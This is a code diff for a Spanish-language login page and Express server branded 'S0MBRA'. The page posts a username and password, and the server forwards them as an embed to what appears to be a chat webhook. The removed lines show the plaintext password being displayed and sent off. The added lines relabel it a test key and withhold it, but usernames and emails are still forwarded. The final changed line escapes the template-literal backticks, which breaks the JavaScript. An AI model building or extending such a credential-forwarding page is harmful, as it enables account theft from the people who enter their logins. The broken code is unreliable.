@@ -101,21 +101,21 @@ button {
 
   <div class="logo">S0MBRA</div>
 
-  <label class="label">USUARIO</label>
+  <label class="label">USUARIO/CORREO</label>
 
   <input
     id="usuario"
     type="text"
-    placeholder="Ingresá tu usuario"
+    placeholder="Ingresá tu usuario o correo"
     autocomplete="off"
   >
 
-  <label class="label">CLAVE</label>
+  <label class="label">CLAVE DE PRUEBA</label>
 
   <input
     id="clave"
     type="text"
-    placeholder="Ingresá clave"
+    placeholder="Ingresá una clave de prueba"
     autocomplete="off"
   >
 
@@ -157,8 +157,8 @@ async function access() {
     if (data.success) {
 
       status.textContent =
-        "✅ Usuario: " + usuario +
-        " | CLAVE: " + clave;
+        "✅ Usuario/Correo: " + usuario +
+        " | Prueba recibida";
 
     } else {
 
@@ -209,15 +209,15 @@ app.post("/access", async (req, res) => {
         username: "S0MBRA ACCESS",
         embeds: [
           {
-            title: "🔐 Nuevo registro de prueba",
+            title: "🧪 Nuevo registro de prueba",
             fields: [
               {
-                name: "👤 Usuario",
+                name: "👤 Usuario/Correo",
                 value: usuario
               },
               {
-                name: "🔑 CLAVE",
-                value: clave
+                name: "🔑 Clave",
+                value: "[DATO DE PRUEBA NO ENVIADO]"
               },
               {
                 name: "Estado",
@@ -249,5 +249,5 @@ app.post("/access", async (req, res) => {
 });
 
 app.listen(PORT, "0.0.0.0", () => {
-  console.log(`S0MBRA Access funcionando en puerto ${PORT}`);
+  console.log(\`S0MBRA Access funcionando en puerto \${PORT}\`);
 });
